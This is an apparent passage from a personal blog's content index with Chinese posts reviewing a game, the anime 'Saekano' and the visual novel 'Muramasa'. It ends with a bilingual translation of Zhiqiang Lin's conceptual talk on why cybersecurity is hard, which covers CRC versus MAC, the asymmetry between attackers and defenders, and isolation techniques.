一位作曲家。所以，当她自己的梦想没有实现。她开始把梦想转移到了他身上。但后来，当他才十一岁时，她生病了，一整年都被迫待在家里。那一年，他开始担心自己会活得不够久。因此，他编了一个故事。关于他所憧憬的自己，了不起的一生的故事。但这只是让他忘记了，他已经度过了了不起的一生。他是怎样为一个新的家庭带来了光明、喜悦和期许。他是怎样遇到一个女孩，他的另据。当她在这个世上孑然无依时，是他令她重新感到安宁。还有，当他生病时，他依然给他的父母以希望。他怎样让他们意识到自己真实的自我。他们几乎已经忘记的自我。所以，当他直到他要去往何处时，他是平静的。因为他已经度过了了不起的一生。充实的一生他已经拥有了所需要的一切品性。他曾那样存在过。\n\n结语我并没哟完整叙述游戏的剧情，因为有些故事剧情的表现与眨眼的交互设计有很密切的联系。同时还有一些极为动人的剧情我刻意没有提，因为我希望看到这篇博客的每一个人都能去玩一遍这个游戏。本杰明无法接受不完美的自己，于是他编了一个憧憬中的故事，改变自己的人生轨迹，希望自己度过一个不平凡的人生。只不过他忘记了，自己的出现已经是某些人心里的光。他让母亲重拾对音乐的热情，使孤独的邻居家女孩感受到温暖，本杰明已经完成了自己了不起的一生，因为他也曾存在过，西西弗斯是幸福的。本杰明和他了不起的一生。以及他的First Love.以及他温柔的亲人。他的猫猫。他的钢琴。一切都在眨眼之间。\nWhat A Great Life You Have，Benny.\n","categories":["Life Spark"]},{"title":"路人女主的养成方法","url":"/2020/05/20/Life%20Spark/%E8%B7%AF%E4%BA%BA%E5%A5%B3%E4%B8%BB%E7%9A%84%E5%85%BB%E6%88%90%E6%96%B9%E6%B3%95/","content":"丸户老贼的《路人女主的养成方法》真的是一部很有意思的作品。既是两个被牵了红线的人相识相恋而相伴的爱情故事，也是一群平凡而又不平凡的普通人追求梦想的励志作品。其详尽的情感描写令我动容，不少吐槽宅文化与业界的neta元素使人会心一笑，原作小说浑厚的笔力与动画精良的制作，塑造出了一批着实让我喜爱的角色。\n\n有黑长直成熟系的学姐，金发双马尾的傲娇青梅竹马，两小无猜长大的表亲，有元气满满的可爱学妹，以及在侦探坡邂逅的天降。路人女主最精彩的刻画，正是在这些已经被商业元素用得庸俗的角色模板，写出每一个人的早已超脱出模板的生动与出彩。原来学姐对待感情其实是如此的胆小，原来英梨梨与伦也曾有过这般的过去，原来学妹和美智留根本就没有参加竞争。原来，总是淡定又善解人意的圣人惠，越了解她，越会知道原来她并不淡定，甚至有些许的腹黑，原来她也不是圣人，只是选择对喜欢的人包容而克制自己，甚至是一个不折不扣的地雷女。但也正是其角色内心的进一步揭露，其形象的逐渐丰满，使她真正展现出了无与伦比的女主角魅力，才导致其拥有了在这类作品中罕见的女主角的人气压倒所有配角的地位。\n\n制作游戏是路人女主在事业上的主线，讨论了创作者对创作应有怎样的态度与热情，普通人与天才之间有着怎样的差距，理想与现实之间该如何协调并表达了创作者对于创作的执着与热情，在不断的挫折之下，伦也一行从未选择过放弃，只有不断地奋斗与坚持。\n\n另外一条主线则是感情线，只能说丸户老贼不愧是白色相簿的作者，对情感细致入微的描写也导致了些许的胃疼，英梨梨与伦也因为童年的背叛，互相喜欢也互相讨厌着，学姐与被童年影响而变得对感情怯懦的伦也相逢，既因为伦也心底的伤痕也因为学姐的怯懦，两人无法有更深的进展。终于伦也遇到了惠，在惠的陪伴，惠的理解，惠的支持下，终于开始成长。正是因为这些因素，伦也选择了放手，让英梨梨与学姐走向属于他们的更辽阔的天空，英梨梨与学姐也因此成为了伦也绝对不会喜欢上的，但也永远喜欢且崇拜着的偶像，至高无上的创作者。从一开始，这部作品的女主角就只有加藤惠一个人，而非乍一看以为的后宫喜剧。有趣的是，我们只知道惠是那么的喜欢伦也，惠从那须高原时起就已经深深的喜欢上了伦也，却不知道惠究竟是从什么时候开始喜欢伦也的，究竟是升学考试的那一次相逢，还是两人相识后的第一次约会，还是在日久深情中的某一天。\n我绝不会忘记这样一部作品为我带来的感动与惊喜，能遇见它真是太好了！\n我永远喜欢圣人惠\n","categories":["Life Spark"]},{"title":"StreetFighter","url":"/2024/03/23/Life%20Spark/StreetFighter/","content":"各单位注意，本人于 2024.3.23 21:17 登上大师位，望周知\n\n感谢图中这位古裂师傅😭👍\n","categories":["Life Spark"]},{"title":"路人女主的养成方法Fin.——终于，所有人都到达了那里","url":"/2020/09/23/Life%20Spark/%E8%B7%AF%E4%BA%BA%E5%A5%B3%E4%B8%BB%E7%9A%84%E5%85%BB%E6%88%90%E6%96%B9%E6%B3%95Fin-%E2%80%94%E2%80%94%E7%BB%88%E4%BA%8E%EF%BC%8C%E6%89%80%E6%9C%89%E4%BA%BA%E9%83%BD%E5%88%B0%E8%BE%BE%E4%BA%86%E9%82%A3%E9%87%8C/","content":" 2020.9.23 11:00，路人女主的养成方法Fin.在B站上映，在惠的生日的9.23的19:07，我怀着莫大的兴奋与喜悦之情与成千上万的粉丝们一同关上了这部收官之作，并不由得为伦也与惠，为BlessSoftware，为这部作品完美的收尾发出了这样一声感叹：终于，所有人都到达了那里！\n\n剧场版为原作GS3，十一，十二，十三卷的内容，穿插了惠，英梨梨与学姐，伦也三方的视角，为观众讲述了故事的结局——惠与伦也在侦探坡时的“起“，一同追逐梦想的”承”和剧场版中迎来“转”之后，终于走向了他们所期望的“合”，英梨梨与学姐以悲恋结尾，但仍向伦也和惠献上了真挚的祝福，BlessingSoftware的第二部作品完成，尽管作品整体褒贬不一，却没有人能对女主角的可爱有任何的不满，在STAFF表与《东京爱情故事》的恶搞neta后，故事迎来了最终的尾声，伦也与惠已经订婚，成为了小有名气的制作公司的BlessingSoftware与成为知名创作者的英梨梨与学姐签约，伦也，惠，美智留，出海，伊织，英梨梨，诗羽，完全体的BlessingSoftware又坐到了一起，向着未来启航，随着众人的欢声笑语，故事拉下了帷幕，终于，所有人都到达了那里。\n\n同时，观看过程中也有着许多惊喜，BD版相对于院线版做出了不少优化，增添了很多面部细节和动作效果，加入了不少对话与新的镜头，并修改了部分文本，使剧情过渡得更加自然，相较于原片约莫多了十多分钟得长度。我不得不感谢丸户这位原作者亲自负责剧本编写与监督，使得几乎需要两季才能拍完的内容得以很好的保留关键内容并制成一部如此优秀的剧场版。同时还有深崎暮人的协力创作，使得画面不仅稳定，同时与同样优异的音乐搭配出了相当好的演出效果，十分精彩。\n《路人女主》这下就彻底完结了，在关注其后续动态的同时，我也不禁回味着它带给我的感动。其中有我迄今为止最喜欢的女主角，有我研究得最为深入的情感故事。加藤惠，在我接触这部作品前几乎闻所未闻，反倒是学姐和英梨梨因为在作品初期中便有的鲜明个性和独树一帜的行为方式，我早已在各类MAD与番剧榜单中看到过不少相关片段，可见惠的路人属性之强。甚至是在我看它之前就已经知道是一位叫“圣人惠”的角色与男主角走到了最后。倒不如说，在那时正是因为我知道这部作品有官配才会一时兴起决定去看，不过当时只知道官配是谁，而不知或者说是不在乎为什么会是她。第一印象也只是在OP中见到了她的微笑而感到些许的心动。最开始观看也仅是很称赞制作组为了塑造惠的路人属性的镜头运用。看着惠平淡得不能再平淡的表情，语气与行为，总感觉有一种特殊的感情在发酵。素日不挑口味地看各种番地我尽管也很欣赏学姐，英梨梨，但惠时我前所未见地，最难以一言以概之的角色，她无法像学姐，英梨梨那样用一个“黑长直”“傲娇青梅竹马”这样的tag概括，终于，在惠配盘了伦也，同时也陪伴了观众一定时间后，在惠自学了编程，吃美智留醋而初显腹黑性格的那一次，我就理解了她为什么是官配。她不是圣人，内心也绝非表现出来的那般平淡，她不是天然呆，也不是腹黑女，更不是三无，她的想法，内心，情感与行为都有很深的可发觉空间，她是一个极为立体且真实的角色，而绝非用来取悦观众的工具人越是去深入思考，就越会为她独特的魅力而心动欧冠。第二季第八集恰巧是最低谷前的回暖，它仅仅是稍稍揭露出了惠的内心，便被千万粉丝称作封神的一集，可当看过了全篇后再度回顾细节以深入角色内心与每一处的行为后，但凡能做到了解故事的前因后果，就一定会沦陷于她的善解人意，她的小动作小心思，她的温柔与真实。如果说故事的前期的解读有太多的遐想的空间，因而不一定准确，那么到了第二季动画的后期，到了原作的第九卷及以后，加藤惠的真实性格与内心被逐渐揭露，观众意识到波岛伊织所言的“地雷女”时什么意思，再到原作GS3篇章，惠被完全揭露出的内心与彻底爆发出的情绪，无不散发着美妙绝伦的女主角魅力与光彩。惠会因为伦也的背叛生气到不肯让对方知道自己读了他的消息，生气到因为满脑子都在想伦也发了什么消息而不断地告诫自己：“加藤惠是一个普普通通地，平平淡淡地女孩”，生气到把伦也的邮件全都打印出来一个字一个字地揪出来批驳，构思伦也来道歉时向他倾倒地话乃至熬夜，惠会失常到一不小心和同伴们说漏嘴暴露出腹黑的性格，会失常到为了报复伦也而召集大家加班加点地制作游戏却踏入圈套，会失常到在波岛兄妹，美智留和学姐地逼问下一句话都答不上来。那个平平淡淡，善解人意的惠的形象彻底崩塌，她会憧憬开朗活泼的出海与美智留的性格，会钦佩学姐与英梨梨令人感到耀眼的才华，会因为伊织能看出自己的小心思且和伦也的关系太好而讨厌他，会因为伦也的种种举措感到头疼，感到开心，感到烦人，感到幸福，感到吃醋，感到爱恋。“圣人惠”并不是圣人，只是单纯的选择对深爱的人包容而克制自己，她也会暗自生气，会心生烦恼，会开心雀跃，会心动不已，她也有小脾气小心思，是一个富有洞察力的“地雷女”，因此在那须高原，她因为伦也和英梨梨的隐瞒感到不满与难过，在这次的剧场版中，她因为伦也的背叛而气愤不止，她不得已在学姐的圈套中被逼问出了真心话，在伦也的归途中令人会心一笑地偷跑，在伦也的表白后说调皮话来报复，以至于在原作中产生了这样的表述：\n\n被他庄重的态度和惊人的握力束缚着，惠的全身都僵直了。 莫非……不……再怎么说……现在应该……肯定……眼看着惠就要陷入漫无止境的胡思乱想 即便如此，不，应该说是正因为如此，惠才把游走于全身的燥热集中于脑部、拼命鼓舞着自己的智慧和勇气，试图在数十种、数百数千种模式当中，搜索出“能够立于不败之地的”反应。“我，我……”“……”不管对方说什么，都要保持平淡的态度。就算遭到了背叛，也不可以哭泣。就算得到了回报，也不可以哭泣。就算对方所说的完全超出了预想，也还是不可以哭泣。不过，露出无可奈何的神情，还是可以被允许的。如果能挤出苦笑，就能取得优势。要是能够用个嘲讽给予还击，那就最棒了。尽管对方并不是一个能够驱使计策的人， 但也必须做好充分的准备，取得胜利。让对方看到自己的软弱的地方，是万万不可以被允许的。“我……我喜欢你，惠！我喜欢的就是三次元的你！”“有必要加上这个‘三次元’吗？”“……喂”因为在此数日间，她就是如此从不间断地深深思念着他，以致这样的小小报复都可以被宽恕了啊。\n\n\n在彻彻底底地了解了加藤惠这个人之后，谁又不会爱称她是我们心中的“圣人惠”呢？\n如此大篇幅地谈论惠的魅力，很大一部分原因在于：学姐和英梨梨是极为特殊地双女主设计，学姐是追逐梦想做游戏的事业线的主角，并能准确地洞察人心，以至于送出了全剧一半以上地关键主公，是感情线上重要地引导者。英梨梨是感情线主角，同时扮演着事业线上BOSS般的角色，在故事之初有伦也最高的好感度，但也因他使伦也在遇见惠之前在感情上变得如此怯懦，对伦也产生了极深的影响。但倘若不从故事整体，而但从伦也一个人的视角来看，加藤惠是绝对意义上的女主角，她与伦也的互相陪伴与共同成长是全篇的核心线索，故事的每一处实质上都是在将讲述个人的成长与接近。\n\n惠与伦也，学姐与英梨梨，BlessingSoftware，他们的故事是本作最大的亮点，同时，不仅从人物和故事的角度，从作者丸户史明对它倾注的心血而言，这部作品具有着相当的深度。它不仅仅是两个人相恋的爱情故事，不仅是这群宅男宅女的追梦旅程，全篇随处可见的neta元素无一不是对ACG界中的某些现象的辛辣讽刺，角色间的吐槽除了玩梗增加趣味性也是对业界的批判与反思。同时，作者借角色之口说出的有关创作的观点，不仅使在塑造角色本身的形象，也是在表达丸户对于创作的思考。创作者应该对创作抱有怎样的热忱？创作者又应有怎样的创作观与态度？什么叫做创作的素养与才能？天才与一般人之间有着怎样的差距？梦想与爱情之间要做出怎样的取舍？这些问题都能在本作中得到丸户的反思与观点。但除了思考这些问题，《路人女主的养成方法》极度侧重表达，抒发并赞美的，是创作者们的激情与专业，是创作者对创作的讴歌与热爱。这种自豪感无一不体现在每一位角色的言行举止之间，因此，我还要说，《路人女主的养成方法》是对二次元的赞歌！是对ACG文化的一封热情不失深沉，喜爱不乏批判的情书！\n\n《路人女主的养成方法Fin》以为这一系列画上了完美的句号，我衷心祝福心爱的每一位角色终于走到了那里，那个每个人都在环线的，属于他们的美好结局与未来！并深深庆幸，自己能与这样一部作品相逢，能够收获这般的幸福与感动！我深信，无论多久，自己总能大声喊出：\n我永远喜欢加藤惠\n","categories":["Life Spark"]},{"title":"这并非英雄的故事","url":"/2024/10/24/Life%20Spark/%E8%BF%99%E5%B9%B6%E9%9D%9E%E8%8B%B1%E9%9B%84%E7%9A%84%E6%95%85%E4%BA%8B/","content":"《装甲恶鬼村正》实在给我带来了太深的冲击，以致于即使这部作品存在着非常多我很讨厌，甚至痛恨的元素的情况下，依然成为了我最喜欢的 Galgame 之一。我必须简单地记录一下本作\n\n\n作品简介\n这并非英雄的故事。\n\n《装甲恶鬼村正》是 N+ 社于 2009 年发行的十周年纪念作品，讲述了装备红色剑胄「村正」的非正式警官凑斗景明追查进行着无差别杀戮的武者「银星号」的故事。本作也是剑圣奈良原一铁的封笔之作（据传写完本作后开道馆去了），其美术肉而不拔，萌而不腻，音乐扣人心弦，荡气回肠，剧本更是名刀出鞘，凡铁自愧，以平庸之作难以望其项背的极高的质量赢得了亚洲及欧美玩家的广泛好评，但由于独特（近乎反人类）的竖排文本排版和巨量的剑道解说（作者私货）使其成为稍有入坑门槛的作品。村正这部作品最富有争议的无疑是 “善恶相抵” 这一概念，有人认为这是 “毁三观” ，亦有人以为其 “纠正三观”。《装甲恶鬼村正》的争议之大令人瞠目结舌，但暂且抛开有争议的地方，村正的世界观之生动，演出表现之震撼，剧情冲突之激烈，人物塑造之深刻皆是 Galgame 界数一数二的水准。\n篇章组成本作按篇章来看由 5 个篇章组成，分别为\n\n共通篇——这并非英雄的故事，不需要立志成为英雄的人。\n英雄篇——这并非英雄的故事，但终会成就英雄。（绫弥一条 END）\n复仇篇——这并非英雄的故事，但罪人仍会受到制裁。（大鸟香奈枝 END）\n魔王篇——这并非英雄的故事，无人能成为英雄，但每个人都在战斗。（小分支茶茶丸 END）\n恶鬼篇——这并非英雄的故事，这是装甲恶鬼村正的传说。（村正 END &#x2F; True End）\n\nBest OST\n\n\nOST\nDescription\n\n\n\nMURAMASA\nOP 曲，命运的痛苦，无奈和咆哮，被以作品名村正冠曲名的含金量\n\n\n白銀昴星\n银星号出场曲，很难想到这样一首舒缓的曲子竟能带来如此的压迫感\n\n\n英雄襲来\n会浮现起那些贯彻角色信念或极具冲击性的发言\n\n\nBLADE ARTS Ⅳ\n教科书级的 BOSS 战 OST\n\n\n凌辱\n沟槽的世道凌辱着每个人的命运\n\n\n遠い心\n完美地抒发了每一个充满故事的人回忆起过去时的惆怅\n\n\nThe Call\n仿佛看到了那个走入夕阳的男人的背景\n\n\n落葉\nED 曲，也是本作最高潮演出处的背景音乐，一切爱恨情仇尽在不言中\n\n\n感想《装甲恶鬼村正》是一幅黑底红字的画，颜色极其浓烈。尽管奈良意识到这点，加入了相当多角色之间打趣逗乐的幽默的桥段，也还是无法掩盖黑暗背景和残酷命运带来的强烈悲剧色彩。\n同时，对于本作的主角凑斗景明，我很难用简单的语言表达出我对这名角色的喜爱。他既善良又残忍，既温柔又冷血，他魔王也是英雄，他是邪恶的杀手，也是正义的伙伴。任何一个脚本家都能写出常规的热血主角，但只有奈良原一铁能写出凑斗景明。他在草菅人命的乱世依旧保持着极高的道德水准，他有着极强的同理心与正义感，他在序章开始前便已杀害二十四人，他在杀死自己最爱的人之后成为了推行善恶相抵戒律的装甲恶鬼。\n《装甲恶鬼村正》并不是通关后能使玩家欢笑的作品，它只能带来五味杂陈的情感体验，但这份说不出来是苦是酸的情感，让我震撼，难忘，叹服。很荣幸，我能遇见《装甲恶鬼村正》。\n\nReference《装甲恶鬼村正》\n","categories":["Life Spark"]},{"title":"Why Cyber Security Is Hard","url":"/2024/12/25/Research%20Note/Why-Cyber-Security-Is-Hard/","content":"林志强教授就职于俄亥俄州立大学，是网络安全研究领域知名学者。他在 2021 年的 OSU Cybersecurity Days 论坛上作出的演讲深入浅出地讨论了网络安全研究领域中的诸多基本问题，令本人受益匪浅。\n翻译如若不周，欢迎指正！\n烤肉视频已上传至 Bilibili\n\n\n讲稿\nHello! Welcome to The Community Forum Session at the Cybersecurity Days. My name is Zhiqiang Lin. I’m a Professor of Computer Science &amp; Engineering at the Ohio State University. I do research on computer security with a particular focus on software security such as vulnerability discovery and software hardening.\n\n你好，欢迎参加网络安全日社区论坛会议。我叫林志强。我是俄亥俄州立大学计算机科学与工程系的教授，从事计算机安全研究，且特别关注例如漏洞发现与软件加固在内的软件安全技术。\n\nToday I’m going to talk about a topic which you may have already thought about namely Why Cybersecurity Is Hard. The reason of why I would like to give this talk is, year 2021 is really a bad year for cybersecurity. So far we have heard numerous cyber attacks and this includes attacks against SolarWinds, Florida Water Plant, the Microsoft Exchange Server and the Colonial Pipeline. These cyber attacks have caused significant damages to our economy and the society.\n\n今天我要讨论一个你可能已经思考过的话题————为什么网络安全如此困难？我想要讨论它的原因在于，2021 年对网络安全来说是非常糟糕的一年。到目前为止，我们已经听闻了无数的包括但不限于针对 SolarWinds、Florida Water Plant、Microsoft Exchange Server 与 Colonial Pipeline 等目标展开的网络攻击事件，它们对人们的经济和社会造成了重大危害。\n\nThen, I’m sure you must have started to wonder “Why there are so many cyber attacks?” or “Why Can Computers Be Attacked So Easily?”. In order to answer this question, let me ask a slightly different question, “Why Can Airplanes Be Attacked So Easily?”. Since like computers, airplane is also our human made artifact. But I know this may trigger you to easily think about the 911 attack and also the airport security such as passenger screening by the TSA which may be more on the management side. So let me focus more on the technology side by changing this question to “Why Can Airplanes Not Be Crashed So Often?”.\n\n那么，我相信你一定已经开始思考为什么会有这么多网络攻击或为什么计算机可以如此轻易地被攻击。为了回答这个问题，我想要先问一个稍微不同的问题，为什么飞机可以如此轻易地被攻击？因为飞机也和计算机一样是人类的造物。但我知道这可能很容易让你想到 911 袭击和例如安检之类的机场安全这些更多地涉及管理方面的思考方向，因此让我修改这个问题为，为什么飞机不经常坠毁，以更好地专注在技术领域的讨论。\n\nWell, we all know airplane is extremely complicated. To build an airplane, it requires tremendous amount of science and engineering knowledge from such as math, physics, aerodynamics, control theory, autopilot, etc. But if you look at the number of the accidents in the past fifteen years in airline industry, you will notice that the rate of crash is extremely low. It’s almost like one among one million. So why we can achieve such a high reliability when building an airplane? Why we cannot build crash resilient computers?\n\n首先，我们都知道飞机极其复杂。制造一架飞机需要大量的科学与工程知识，例如数学、物理、空气动力学，控制理论，自动驾驶等。但如果你去查看过去十五年航空业的事故数量，将会发现飞机的坠毁率极低，几乎是百万分之一。那究竟是为什么人们能做到在制造飞机时实现如此高的而可靠性却不能制造能够抗破坏的计算机呢？\n\nThen let’s look at the aircraft design. An airplane has many key components such as the engines, the wings, the stabilizers and so on. To make aircraft resilient to crash, it has included many of the best engineering principles and techniques, from fault-avoidance by use such as formal methods, to fault-tolerance by using such as redundancy design, single version, multi version, CRC, Hamming code and multiple-voting, etc. To get a sense on what is fault-tolerance, let’s look at one of the fault-tolerant techniques CRC to see how it works. CRC stands for Cyclic Redundancy Check. You can think about it as a checksum of a message. Here is how it works.\n\n接下来，让我们看看飞机的设计。一架飞机有着诸多关键的组件，例如引擎、机翼、稳定器等。为了避免飞机坠毁，它包含了从故障避免到故障容忍的许多最佳工程原则与技术，例如使用形式化方法实现故障避免，使用冗余设计、单&#x2F;多版本、CRC、汉明码和多重投票等手段进行实现 故障容忍。为了让大家简单理解什么是故障容忍，让我们看向其中一种技术，CRC，以了解它是如何工作的。CRC 代表循环冗余校验，你可以将其视作一种消息校验和。它是这样工作的：\n\nAssume Alice wants to send a message to Bob. During the transmission of the message, there could be cosmic ray, air molecules, etc that can cause bit flips of the message. Therefore, when Bob receives the message, it can be a completely different one because of the bit flips. To detect such a bit flip, CRC is introduced. Now to transmit our message, Alice will first compute the CRC of the message and attach the CRC with the message and send it to Bob. Bob will also then verify whether the CRC is consistent with the message, if not, bit flips are detected.\n\n假设 Alice 想向 Bob 发送一条消息，在消息的传输过程中，可能会有宇宙射线或空气分子之类的因素导致消息的比特位发生翻转。因此，当 Bob 收到消息时，收到的消息可能会因为位翻转而变得完全不同。为了检测这种位翻转，人们引入了 CRC。现在为了传输消息，Alice 将首先计算消息的 CRC，并将 CRC 附加到消息上一同发送给 Bob。Bob 随后将验证 CRC 是否与消息一致，如果不一致即可检测到位翻转。\n\nThen, is CRC secure against attacks? Well, the answer is no, since CRC is not designed for security but rather for reliability because fundamentally attackers can intercept the message, modify the message from m to m prime and regenerate a new CRC for m prime. And then when Bob verifies, the CRC will still be consistent with the modified message m prime.\n\n那么，在遭受到攻击时，CRC 安全吗？好吧，答案是否定的，因为 CRC 不是为安全性而是为可靠性设计的。显然攻击方能够拦截消息，修改它并重新生成 CRC。当 Bob 收到消息并验证时，CRC 依然与修改后的消息一致。\n\nThen how we solve this security problem? Well, the way to defeat attackers’ modification is to use message syndication code namely Mac, in which our cryptographic key is first shared between Alice and Bob. Then when sending the message from Alice, it will use both the message and the cryptographic key together to generate our Mac. Therefore, attackers cannot modify the Mac because they do not have the key. But Bob Can still verify the message because he has the key.\n\n那么，人们是如何解决这一安全问题的？避免攻击方修改的方法是使用叫做 Mac 的消息认证码，其中密钥在 Alice 和 Bob 之间共享。这样当 Alice 发送消息时会基于消息内容和密钥生成 Mac。攻击方无法在没有密钥的情况下修改 Mac 而 Bob 却仍然可以验证消息，因为他有密钥。\n\nSo now you can see clearly. The essence of reliability is to deal with the errors from the natural environment such as radiations, whereas the essence of cybersecurity is to deal with the intelligent adversary. So cybersecurity is an inherently adversarial discipline. There are always two parties, offenders and defenders. And they always play the games by trying to exploit the assumptions and weaknesses of the other in order to win the game. Unfortunately the game is completely unfair. Because it is completely asymmetric as defenders. They must defend against everyone ability, both known and unknown through every vector and must do so perfectly. But offenders need only one tiny mistake from the defenders in order to win the game.\n\n因此，现在你可以清楚地知道，可靠性的本质是处理来自自然环境的错误，例如辐射，而网络安全的本质是提防聪明的敌手。因此网络安全本质上是一门对抗性的学科。总是有两方，攻击方与防守方，在试图利用对方的假设与弱点不断地进行博弈以在攻防对抗中取得胜利。不幸的是攻防对抗完全不公平，因为它完全不对称。防守方必须防御所有方位的攻击，无论其已知还是未知，并且需要防御得尽善尽美，反观攻击方只需要能抓到防守方犯下的一个微小的错误便能取胜。\n\nDefenders’ strategies chiefly include making it expensive for offenders to attack for example by adding more layers of defenses. And whereas offenders’ strategists are keeping searching for just one vulnerability. There are also dilemmas in defenders, you cannot defend against their attacks which you don’t know exist. For instance, to fight for covid-19, we need to first develop the Vaccine based on the symptoms from the infected patients. Then, when viruses comes again, our immune system can stop its intrusions. If there are other new viruses such as the beta variant, we have to repeat this process again. In cybersecurity, it works the same and you cannot defeat their attacks you don’t know exist.\n\n防守方的策略主要是提高攻击的成本，例如增加防御的层数，而攻击方的策略是持续搜寻目标的某一漏洞。防守方还面临着一些困境————你无法防御你不知道的攻击。例如为了抵御 COVID-19 ，我们需要先基于感染患者的症状研发并注射疫苗才能让我们的免疫系统在病毒出现时阻止它的入侵。如果出现了新的病毒例如 β-变体，我们则必须先重复这一过程。对于网络安全也同理，你无法防御你不知道其存在的攻击。\n\nI have introduced how offenders and defenders play the game. Let’s zoom in to say who are the offenders, what are the motivations and how powerful are they. There could be various offenders. This includes script kiddies, hacktivist, insiders, cyber criminals and even state sponsored attackers, who have unlimited resources. They are motivated for various reasons such as financial gain, intellectual property, business competition, cyber warfare, politics or social gain, etc. They are extremely powerful, and they can use all the tools available today such as cryptography, AI, automation and even quantum computers when they come out. I want to particularly emphasize that the offenders are both humans and machines. We know exactly their strength such as humans are really good at intuition, abstraction and creativity and machines are good at brute force, precision, and they can be scaled massively. And a machine never feels tired, they can easily perform sophisticated tasks and they can be easily replicated and they have our forever memory. So it is really hard to defeat such types of offenders.\n\n我已经介绍了攻守双方是如何博弈的。让我们更进一步地讨论攻击方有哪些，有着怎样的动机以及有多么危险。攻击方的画像多种多样，包括但不限于脚本小子、黑客行为主义者、业内人士、网络罪犯甚至是有无限资源的政府资助的攻击方。它们的动机多种多样，可能是为了经济利益、知识产权、商业竞争、网络战、政治或社会利益等。它们非常危险且掌握着如今所有可用的密码学、人工智能、自动化甚至未来的量子计算机在内的各种工具。我想要特别强调的是，攻击方既指代人类也指代机器。我们熟知它们各自的优势，例如人类擅长直觉、抽象和创造，而机器擅长暴力破解与要求精确和准确度的工作并且可以大规模扩展。机器永远也不会感到疲惫，能够轻松地执行复杂的任务，拥有着永久的记忆甚至还能被轻易地复制。击败这样的攻击方当真是一件非常困难的事。\n\nIn order to win the game, defenders have to learn a lot of knowledge. This includes from fundamental theory such as Game theory, access control and assurance, to computer assistance knowledge such as operating systems security, software security, network security, physical layer security, to various application domains such as mobile, cloud, Edge, IoT to various techniques such as vulnerability analysis, fuzzing, reverse engineering and data analytics to even human factors such as social engineering and risk management. So it is really complicated\n\n为了在攻防对抗中取得胜利，防守方必须学习非常多的知识，包括：\n\n基础理论例如博弈论，访问控制\n计算机辅助知识例如操作系统安全，软件安全，网络安全，物理层安全\n应用领域知识例如移动，云，边缘，物联网\n各种技术知识例如漏洞分析，模糊测试，逆向工程，数据分析\n甚至还有人类因素方面的知识例如社会工程和风险管理\n\n它真的很复杂。\n\nWhy Does Cybersecurity Become Harder and Harder? Why year 2021 is such a bad year for cyber security? Well, this lies in the Dilemma between Isolation and Convenience. Let’s look at the history of cyber evolution to understand this Dilemma. In the early days, computers were mostly built for single users or collected with trusted users. However, when Internet was born computers started to be connected with the untrusted ones in the Internet. Then later, when moving to the mobile era, more and more devices such as even your phones and tablets are collected. Today we are in the era of IoT, remaining computing devices including even our cars are connected to the Internet. You can also see that our trust paradigm has evolved from earlier trusting everything to trust nothing, which leads to the zero trust, an extremely popular concept in the security industry today.\n\n为什么网络安全在变得越来越难，为什么 2021 年的网络安全会如此糟糕？其原因在于隔离性与便利性之间的两难困境。让我们通过观察网络空间的进化史来理解这一困境。早期，计算机主要是为了单用户或受信任用户构建的。然而当互联网诞生后，计算机开始与互联网中那些未被信任的用户连接。再后来，当进入到移动互联网的时代，越来越多的设备例如手机与平板电脑都被接入到了互联网中。现在，我们身处物联网的时代，其余的计算设备例如车辆都被接入到了互联网。可以发现我们的信任范式发生了进化，从早期的信任一切进化到了一切不信，后者导向了零信任这一当今安全行业中非常流行的概念。\n\nIn the zero trust architecture, devices today should not be trusted by default even if they are connected to our managed corporate network such as the corporate LAN and even if they were previously verified. Let’s also look at why we have to do this. One dimension to look at is their attack surface. This is how it looks like today. You can see many of your home devices such as your cameras, your locks, your TVs are connected to the Internet. Critical infrastructures such as power plants, smart grids, hospitals are connected to the Internet as well. Certainly, given such a large attack surface, it will be easier for attackers to find one single vulnerability and attack these systems. That is why it is not a surprise for a water plant to be attacked this year. You can imagine many other cyber attacks will happen.\n\n如今在零信任架构中，设备默认不被信任，哪怕它们连接到了我们管理的公共网路中例如公共的局域网甚至哪怕它们此前已被验证。让我们看看为什么不得不这样做。我们需要考虑的第一个维度是攻击面。你可以看到你的摄像头、门锁、电视都连接到了互联网。那些关键基础设施例如电厂、智能电网和医院也都连接到了互联网。当然，考虑到如此大的攻击面，攻击方更容易找到用于攻击这些系统的某一漏洞。这就是为什么今年水厂被攻击并不令人惊讶，不难想象还会有许多其它的网络攻击将会发生。\n\nWhat have defenders been working on over the years, are we getting better at defending against cyber attacks? In the rest of my talk, I would like to briefly talk about the following four directions, Inventing isolation primitives, Developing memory safe programming languages, Formal revocation and lastly, using AI for cybersecurity.\n\n这些年来防守方们都做了哪些工作，是否能够更好的防御网络攻击？在我的演讲的剩余部分，我想简要谈谈以下四个方面\n\n发明隔离原语\n开发内存安全编程语言\n形式化验证\n为网络安全使用 AI\n\n\nThe first one isolation, I have talked about the dilemma between isolation and convenience. Because more devices are connected to the Internet for our conveniences, it has huge security problems. But in order to achieve security we have to use isolation. Professor Gene Spafford once said “The only system which is truly secure is one which is switched off and unplugged, locked in a titanium land safe, buried in a concrete bunker and is surrounded by nerve gas and very highly paid armed guards”. But we also know such truly secure computers are useless. Therefore over the years, security community has developed numerous isolation primitives to achieve the balance between convenience and security.\n\n针对第一点，隔离技术，我已经讨论了隔离性与便利性之间的两难困境。由于更多的设备出于便利性的目的连接到了互联网上，自然也出现了巨大的安全问题。但我们必须为了保证安全性而使用隔离技术。Gene Spafford 教授曾说过：“唯一真正安全的系统是断电拔插头后锁在钛制保险箱里被埋在充满神经毒气的重兵把守的混凝土掩体中的系统”。但我们也知道这种真正安全的计算机是无用的。因此，多年来，安全社区开发了许多的隔离原语，以达成便利性与安全性之间的某种平衡。\n\nThis includes, from virtual memory, to ring protection, to virtualization, to https, which is a cryptography based isolation, Arm TrustZone, Intel VT, AMD-V to recently hardware-based sandboxes such as Intel SGX, AMD SEV to even Intel TME and MKTME, which are not market available at this moment. So here is how it looks like in today’s computer. It has many software and hardware building isolations. From physical layer to virtual machine monitor layer by using such as MPX, Intel VT or AMD SEV, to OS layer such as the Ring architecture and virtual memory, to application layer such as Intel SGX and encryptions. Meanwhile, When computers communicate with each other, they will use encrypted channels which is a very strong isolation primitive\n\n这包括从虚拟内存，到环形保护，到虚拟化，到 HTTPS（一种基于密码学的隔离），到 Arm TrustZone，Intel VT，AMD-V 到最近的基于如 Intel SGX，AMD SEV 甚至目前未上市的 Intel TME 和 MKTME 这样的基于硬件的沙箱技术。它有许多软件和硬件构建的隔离，从物理层到虚拟机监控层到 OS 